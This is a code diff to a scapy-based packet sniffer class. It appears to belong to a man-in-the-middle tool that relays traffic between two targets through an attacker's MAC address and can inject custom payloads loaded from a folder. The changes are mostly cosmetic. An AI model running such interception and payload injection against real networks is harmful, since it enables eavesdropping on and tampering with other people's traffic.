@@ -2,7 +2,7 @@ import scapy.all as scapy
 import datetime
 import os
 from importlib import import_module
-
+import sys
 
 class Sniffer:
 
@@ -30,13 +30,14 @@ class Sniffer:
             while True:
                 option = input("Choose one of the payload options:\n 1- No payload, "
                                "just print the sniffed packets\n "
-                               "2 - Custom payload\n")
+                               "2- Custom payload\n")
                 if option == '1':
                     arg = None
                     break
                 if option == '2':
-                    file = input("Enter the path to file that implements the payload without the extension, ex: abc.py should "
-                                "be entered as abc only\n")
+                    file = input("Enter the name of the file stored in payloads folder that implements the payload without the "
+                                 "extension, ex: example.py should be entered as example only\n")
+                    sys.path.insert(1, "payloads/")
                     mod = import_module(file)
                     arg = getattr(mod, "pkt_payload")
                     break
@@ -50,14 +51,13 @@ class Sniffer:
         scapy.sniff(iface=self.iface, filter=capture_filter, prn=lambda x: self.forward_packets(x))
 
     def forward_packets(self, scapy_packet):
-        #print(scapy_packet.summary())
-
         if self.write_to_pcap["wr"] is True:
             scapy.wrpcap(self.write_to_pcap["arg"], scapy_packet, append=True)
 
         if "IP" in scapy_packet:
             if scapy_packet["IP"].dst != self.attacker["IP"] and scapy_packet["Ethernet"].dst == self.attacker["MAC"]:
-                scapy_packet["Ethernet"].dst = self.target_1["MAC"] if scapy_packet["Ethernet"].src == self.target_2["MAC"] else self.target_2["MAC"]
+                scapy_packet["Ethernet"].dst = self.target_1["MAC"] if scapy_packet["Ethernet"].src == self.target_2["MAC"] else \
+                self.target_2["MAC"]
                 scapy_packet["Ethernet"].src = self.attacker["MAC"]
 
                 pkt = self.insert_payload(scapy_packet)
@@ -65,6 +65,7 @@ class Sniffer:
 
     def insert_payload(self, scapy_packet):
         if self.payload_option["option"] == "1":
+            print(scapy_packet.summary())
             return scapy_packet
         elif self.payload_option["option"] == "2":
             # self.payload_option["arg"] here is the function "pkt_payload" that receives (self, scapy_packet) as argument and
@@ -81,4 +82,3 @@ class Sniffer:
         ip = route.route(dst=self.target_1["IP"])[1]
         mac = scapy.get_if_hwaddr(self.get_iface())
         return {"IP": ip, "MAC": mac}
-
